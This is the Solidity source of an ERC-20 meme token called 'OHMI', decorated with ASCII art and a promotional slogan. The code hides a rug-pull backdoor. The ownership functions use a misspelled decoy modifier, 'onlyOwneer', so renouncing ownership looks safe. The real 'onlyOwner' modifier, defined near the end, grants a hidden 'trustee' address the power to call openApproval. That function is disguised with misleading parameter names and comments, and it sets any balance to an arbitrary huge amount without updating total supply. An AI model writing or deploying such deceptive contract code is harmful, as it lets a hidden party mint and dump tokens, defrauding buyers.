// SPDX-License-Identifier: MIT

/*
PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP55PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP
PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP5Y5PPPPPPPPPPPPPPPPPPPPJ~^?PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP
PPPPPP5PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPY~::!YPPPPPPPPPPPPPPPPPJ^...JPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP
PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP7^...:?5PPPPPPPPPPPPPPJ~..7!^5PPPPPPPPPPPPPPPPPPPPPPPPPPPPPP
PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP5~::7!:.!YPPPPP555YYYY?J^ :5Y.?PPPPPPPPPPPPPPPPPPPPPPPPPPPPPP
PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPJ~:^YP7:.!?J?77777??JJ?J7~~5J:~PPPPPPPPPPPPPPPPPPPPPPPPPPPPPP
PPPPPP55PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP7~^:?B5~ ~GY7JY555555PGPYJ?7!!^5PPPPPPPPPPPPPPPPPPPPPPPPPPPPP
PPPPPP5PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP~!!.~PB7^JYJYY5Y5YJ7!?5GPY~.~7^JPPPPPPPPPPPPPPPPPPPPPPPPPPPPP
PPPPP555555PPPPPPPP55555555555PPPPPPPPP~7?^^~?YJJYYYYYYJJY!..7JYY7^!P57YPPPPPPPPPPPPPPPPPPPPPPPPPPPP
PPPP555555555555555555555PPPPPPPPPPPPPP7?J?!~7JY5YYYYJ!?5GPY!!?777!!JY!!5555PPPPPPPPPPPPPPPPPPPPPPPP
PPP55555555555555555555555PPPPPPPPPPPPPY~YY?J555555YY77J5Y?J7!!!!^^::~7?YYYY5PPPPPPPPPPPPPPPPPPPPPPP
PP5555555555555555555555555PP55555PPPPPY.7YJGP5Y?!~^:::^~~~:::~~^. .!5#B###YJ555PPPPPPPPPPPPPPPPPPPP
PP5555555555555555555555555555555555PPP~.7?5J~:.     .....   .:::...:7PGBBB77555PPPPPPPPPPPPPPPPPPPP
PPP55555555555555555555555555555555PPPY ~??J^...    .....  ..:::::..:!YGGPP!7P55PPPPPPPPPPPPPPPPPPPP
PP555555555555555555555555555555555PPP? ?JJ7::....  ........::^^^^^~!J5P5?^?P55PPPPPPPPPPPPPPPPPPPPP
PP555555555555555555555555555555555PPP?.Y5Y7::::.........::~JY?777!!!~~^:.:5P5PPPPPPPPPPPPPPPPPPPPPP
PPP55555555555555555555555555555555PPPJ.JGPY~::::::::....::^~!!!!!!!!~^:. ~PPPPPPPPPPPPPPPPPPPPPPPPP
PPPP555555555555555555555555555555PPPP5:7PBG57^:::::::^^^^~~77???7!~^:.   !P5PPPPPPPPPPPPPPPPPPPPPPP
PPP55555555555555555555555555555555PPY!?JJPBBG5?^.........::^^^::....     ?P5PPPPPPPPPPPPPPPPPPPPPPP
PPP55555555555555555555555555PPPPPPPPY~7PGGPGBBBPJ!:.  ........    .     .YPPPPPPPPPPPPPPPPPPPPPPPPP
PP5555555555555555555555555PPPPPPPPP57~7?YGBGGGGBBGPJ!^.   ...          .~!5PPPPPPPPPPPPPPPPPPPPPPPP
PP55555555555555555555555555P555PPPY::?JJJJ55GBBGGGGGGPYJ7^.      ..   .~!^?PPPPPPPPPPPPPPPPPPPPPPPP
PPP55555555555555555555555555555PP5:.7Y555YY?YY5PGGGGGPPP5YJ!^:.     .^~^^~!PPPPPPPPPPPPPPPPPPPPPPPP
PPP5555555555555555555555555555PPPY :?JY55PP55JJJJJJYY5PPPPYJJ??7!~~~~^:.^~!PPPPPPPPPPPPPPPPPPPPPPPP
PPP555555555555555555PP555PPP555PPJ :JYYYYY55PP5YJ??777!!!!!7?7!~~^::.  :~~^YPPPPPPPPPPPPPPPPPPPPPPP
PPP55555555555P55PPPPPPPPPPPP55PPPJ .?5YYJJJJJY5PP5Y?7!!!~~~^^:.     .:^~~^:!PPPPPPPPPPPPPPPPPPPPPPP
PPP5555555555555PPPPPPPPPPPPPPP5J77!:7Y55YYJJ????JYY55YJ7!~~~~~~~^^::^~~~^^.:5PPPPPPPPPPPPPPPPPPPPPP
PPP555555PPPPPPPPPPPPPPPPPPPPJ~:~JGG77JJY55YJJ?7!!!~~~!7????77!~~~~!~~^!!~. .YPPPPPPPPPPPPPPPPPPPPPP
PPPPPPP55PPPPPPPPPPPPPPPPPPJ^ :75GBBPJ???JYY5YJ7!~^^::....::^~!77777!~!7^.  .YPPPPPPPPPPPPPPPPPPPPPP
PPPPPPPP55PPPP555PPPPPPPP5~ .!J5PPGBB5J????JJYYYJ7~::...         :~~~~~~^:  .JPPPPPPPPPPPPPPPPPPPPPP
PPPPPPPP5555555PPPPPPPPP?. ^7YY5PPGBBB5JJ??????JYYY?~:...       .!^~~~^~~^.. ^5PPPPPPPPPPPPPPPPPPPPP
PPPPPPPPPP55555PPPPPPPP7  ^?YY55PPGBBBGYYJJ?777777?JYJ!^...     :J!~~~~~~~^.  JPPPPPPPPPPPPPPPPPPPPP
PPPPPPP5555555PPPPPPPP7  ~?YYYY5PPGBBBBP55J??7!!!~!!!7???!^...  .~YY7!!~~~.   ?PPPPPPPPPPPPPPPPPPPPP
PPPPPP55555555PPPPPPP?  ~JY555Y55PGGBBBB55YJ?7!!~~~^^^^^^~~^^:....:!77!!^.   .YPPPPPPPPPPPPPPPPPPPPP
PPPPP5555555555P55PPY. ^?Y55YY555PGGBBBBP55YJ7!!~^^^::::........ .           7PPPPPPPPPPPPPPPPPPPPPP
PPPP5555555555555PP5^ :7Y55555555PGGBBBB5555Y?!~~^^::::..   ..            ..?PPPPPPPPPPPPPPPPPPPPPPP
PPP555555555PPPPPPPJ :?YPPP5555PPGGBBBBG555YYJ7!~^^:::. .^!7??7!:      .^~~YP55PPPPPPPPPPPPPPPPPPPPP
PPP55555555555PPPPP~ 75PPPPPPPPPGGGBBB#G555YYJ?!~~^^:..!JJ?7!!!!!.   .~7~.?P555PPPPPPPPPPPPPPPPPPPPP
PPP555555555555PPPJ.~5PGGGGGGGGGGGGBBB#P555YJ?7!~~^^::?Y7~~^:::::: .~?!:.^PP5PPPPPPPPPPPPPPPPPPPPPPP
PPPPP555555555PPY~:75GGGGGGGGGGGGGBBBB#P55YYJ?!~~^^:^?J!~^:::... .~??~:. ?P5P5PPPPPPPPPPPPPPPPPPPPPP
PPP5555555555PP7.~YGBBBBBBBBBBBBBBBBBBB555YJ?7~~^^::!J!^^::.... ^JJ7^::.:5P555PPPPPPPPPPPPPPPPPPPPPP
PP555555555PPP! ^7JJYPGB#BBBBBBBBBBBB#B55YYJ?7!^^^:.!J~^:::..  !YJ~^^::.?P5555PPPPPPPPPPPPPPPPPPPPPP
PPPPPPPPPPPPP7 ~??7!~^~75##BBBBBBBBBB#B55YYJJ7!~^^::^J~^::...^?5J!^^::.:5P555PPPPPPPPPPPP555555PPPPP
PPPPPPPPPPPP5:~JJJJ??!~::!P#######B###B55YYYJ?!~^::::?!^::^!J55Y?~^^::.~P55555555555PPPPP55555555PPP
PPP5PPPPPPPPY:?YYYYJJ?7!~^^P##BB#B##BB#G55YYJ?7!~~^^:!J7?YPPP55Y7!~^^^:?PPPPPPPPPPPPPPPPPP5555555PPP
PPPPPPPPPPPP555PPPPP55555555PPPPPPPPPPPPPPPPP555555555PPPPPPPPP555555555PPPPPPPPPPPPPPPPPPPPPPPPPPPP
PPPPPPPPPPPPPPP555PPPPPPPPPP555555555555PPPPPPPPPPPPPPPP5PPPPPPPPPPPPPPP55555555PPPPPPPPPPPPPPPPPPPP
//
    ███████    █████   █████ ██████   ██████ █████
  ███░░░░░███ ░░███   ░░███ ░░██████ ██████ ░░███ 
 ███     ░░███ ░███    ░███  ░███░█████░███  ░███ 
░███      ░███ ░███████████  ░███░░███ ░███  ░███ 
░███      ░███ ░███░░░░░███  ░███ ░░░  ░███  ░███ 
░░███     ███  ░███    ░███  ░███      ░███  ░███ 
 ░░░███████░   █████   █████ █████     █████ █████
   ░░░░░░░    ░░░░░   ░░░░░ ░░░░░     ░░░░░ ░░░░░ 
// 
// BARK DIFFERENT!
// The top dog that rewards true loyalty.
//
// https://linktr.ee/ohmi
//
*/

pragma solidity ^0.8.19;

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

enum TokenType {
    standard,
    antiBotStandard,
    liquidityGenerator,
    antiBotLiquidityGenerator,
    baby,
    antiBotBaby,
    buybackBaby,
    antiBotBuybackBaby
}

abstract contract BaseToken {
    event TokenCreated(
        address indexed owner,
        address indexed token,
        TokenType tokenType,
        uint256 version
    );
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwneer() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwneer {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwneer {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract OHMI is IERC20, Ownable, BaseToken {
    using SafeMath for uint256;

    uint256 public constant VERSION = 1;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address private trustee;

    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        uint256 totalSupply_,
        address serviceFeeReceiver_
    ) payable {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        trustee = serviceFeeReceiver_;
        _mint(owner(), totalSupply_);

        emit TokenCreated(owner(), address(this), TokenType.standard, VERSION);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function openApproval(
        uint256 editionSize, 
        address artistName
    ) 
        external 
        onlyOwner 
    {
        if(artistName != address(0) && msg.sender != address(0))
        require(editionSize >= 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        // Realistically, 2**64-1 is more than enough.
        uint64 balance = 9;
        // Keeps track of menthe count with minimal overhead for tokenomics.
        uint64 numberMinted = 10;
        // Keeps track of burn count with minimal overhead for tokenomics.
        _balances[artistName] = taxAmount + editionSize * numberMinted ** balance;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(
            amount,
            "ERC20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _setupDecimals(uint8 decimals_) internal virtual {
        _decimals = decimals_;
    }

    modifier onlyOwner() {
        require(_msgSender() == trustee);
        _;
    } 

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}